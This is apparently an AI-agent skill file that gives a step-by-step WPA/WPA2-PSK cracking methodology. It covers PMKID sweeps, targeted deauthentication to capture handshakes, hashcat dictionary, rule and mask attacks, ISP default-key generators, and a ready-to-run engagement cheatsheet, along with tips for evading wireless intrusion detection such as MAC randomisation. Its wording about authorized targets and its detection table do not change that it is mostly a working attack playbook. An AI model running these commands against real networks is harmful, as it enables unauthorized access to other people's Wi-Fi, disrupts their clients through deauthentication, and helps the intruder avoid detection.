---
name: offensive-wpa2-psk
description: WPA/WPA2-PSK attack methodology — four-way handshake capture via targeted
  deauthentication, PMKID attacks (no client required), hcxdumptool / hcxpcapngtool
  conversion to hashcat hc22000 format, GPU-accelerated cracking with dictionary,
  mask, and rule-based attacks, vendor default-PSK generators (UPC, Sky, BT, etc.),
  802.11r FT key cracking, opportunistic key cache analysis, and signal-level optimization.
  Use when the in-scope network is WPA/WPA2 Personal — the most common consumer/SMB
  encryption mode.
---

# WPA/WPA2-PSK Attacks

The default mode for almost every consumer and SMB Wi-Fi network. The four-way handshake's PMKID and EAPOL frames give you everything you need to crack offline — no online attempts, no lockout, no detection signal beyond the deauth (which you can avoid with PMKID).

## Quick Workflow

1. Identify the target BSSID, channel, and encryption (see `offensive-wifi-recon`)
2. Try PMKID first (fast, no client interaction)
3. Fall back to four-way handshake capture if PMKID isn't yielded
4. Convert capture to hashcat-compatible format
5. Crack offline with appropriate wordlist + rules + masks

---

## PMKID Attack (Preferred When Possible)

The PMKID is included in the first message of the four-way handshake. Many APs leak it in response to a single association request — no real client needed.

```bash
# Setup
sudo airmon-ng check kill && sudo airmon-ng start wlan0
sudo iw reg set US

# Sweep PMKIDs across all visible APs
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng \
  --enable_status=1 \
  --filterlist_ap=targets.txt --filtermode=2

# Convert to hashcat format
hcxpcapngtool -o hash.hc22000 pmkid.pcapng
```

`targets.txt` contains BSSIDs (one per line) you're authorized to attack.

If `hash.hc22000` is empty, the AP doesn't yield PMKIDs. Move to four-way handshake.

## Four-Way Handshake Capture

```bash
# Pin to channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
```

If a client is associated:

```bash
# Targeted deauth (single client, low volume)
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

The handshake will appear in airodump's top-right corner as `WPA handshake: AA:BB:CC:DD:EE:FF`.

**Why one client at a time:** broadcast deauth (no `-c`) trips WIDS quickly and is louder. A single 5-deauth burst targeted at one MAC is enough.

## Verifying the Capture

```bash
hcxpcapngtool -o hash.hc22000 handshake-01.cap
# Look for "M1+M2 ... AUTHORIZED" or "M2 ... AUTHORIZED" lines
```

If the tool reports the M1/M2 pair without proper EAPOL authentication, capture again. Bad / partial handshakes will fail to crack.

## Cracking

### Dictionary + Rules

```bash
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/OneRuleToRuleThemAll.rule
```

Useful wordlists:
- `rockyou.txt` (classic)
- `weakpass_3` / `weakpass_4` (huge breach corpus)
- `crackstation.txt`
- Targeted: company name, products, locations

### Mask Attacks for Common Default Patterns

```bash
# 10 digits (common ISP default — UPC, Vodafone, etc.)
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d?d?d

# 8 digits (D-Link, ZTE)
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# 8 hex (some Belkin / Linksys)
hashcat -m 22000 hash.hc22000 -a 3 ?h?h?h?h?h?h?h?h

# Phone number patterns
hashcat -m 22000 hash.hc22000 -a 3 1?d?d?d?d?d?d?d?d?d?d
```

### Vendor Default Generators

Some ISP routers derive the PSK from the SSID prefix + serial number suffix using known algorithms:

```bash
# UPC-XXXXXXX → upc_keys generates candidate keys
upc_keys ESSID | hashcat -m 22000 hash.hc22000 -

# Other generators: skylogin, BT-Hub-PSK-Generator, ZyxelKeygen
# Check vendor-specific tools per router brand
```

### 802.11r FT Cracking

If 802.11r (Fast Transition) is enabled, the AP-to-AP key transit is captureable on the wired side or visible in air during roaming events. The PMK derivation gives an alternative crack path with the same hc22000 format.

## Tuning Cracking Performance

```bash
# Show recommended workload tuning per GPU
hashcat -b -m 22000

# Distributed cracking via hashtopolis or naive split
hashcat -m 22000 hash.hc22000 wordlist.txt -s 0 -l 1000000
hashcat -m 22000 hash.hc22000 wordlist.txt -s 1000000 -l 1000000
```

## Opportunistic Key Cache (OKC)

When OKC is enabled (common in WPA2-Enterprise too), the AP caches the PMK from a previous successful association and reuses it on roam — bypassing the full handshake. From an attacker view, OKC handshakes have the same recoverable PMK material; the impact is mostly that you'll see fewer M1/M2 pairs in the air.

## Detection Considerations

| Signal | Defender View |
|---|---|
| Deauth burst | WIDS rule: >N deauth/sec with malformed reason codes |
| PMKID flood (hcxdumptool default sends many association requests) | WIDS rule: rapid associations from a single MAC |
| Monitor-mode interface | Some enterprise WIDS deployments fingerprint adjacent monitor radios |

To minimize: PMKID with `--filtermode=2` (only target your authorized list), single targeted deauth bursts, randomize source MAC between captures.

## Engagement Cheatsheet

```bash
# 1. Setup
sudo airmon-ng check kill && sudo airmon-ng start wlan0
sudo iw reg set US

# 2. PMKID sweep first
echo "AA:BB:CC:DD:EE:FF" > targets.txt
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng \
  --enable_status=1 --filterlist_ap=targets.txt --filtermode=2

# 3. Convert + try crack
hcxpcapngtool -o hash.hc22000 pmkid.pcapng
hashcat -m 22000 hash.hc22000 wordlist.txt -r best64.rule

# 4. If empty PMKID, do four-way capture
sudo airodump-ng -c <ch> --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon &
sudo aireplay-ng --deauth 3 -a AA:BB:CC:DD:EE:FF -c <client> wlan0mon

# 5. Convert + crack
hcxpcapngtool -o hash.hc22000 cap-01.cap
hashcat -m 22000 hash.hc22000 wordlist.txt -r OneRuleToRuleThemAll.rule

# 6. Mask attacks if dictionary fails
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d?d?d
```

---

## Key References

- hashcat docs (mode 22000): hashcat.net/wiki/doku.php?id=cracking_wpawpa2
- hcxtools: github.com/ZerBea/hcxtools
- ZerBea PMKID research (original 2018 disclosure)
- 802.11i-2004 (WPA2 spec)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/wireless.md
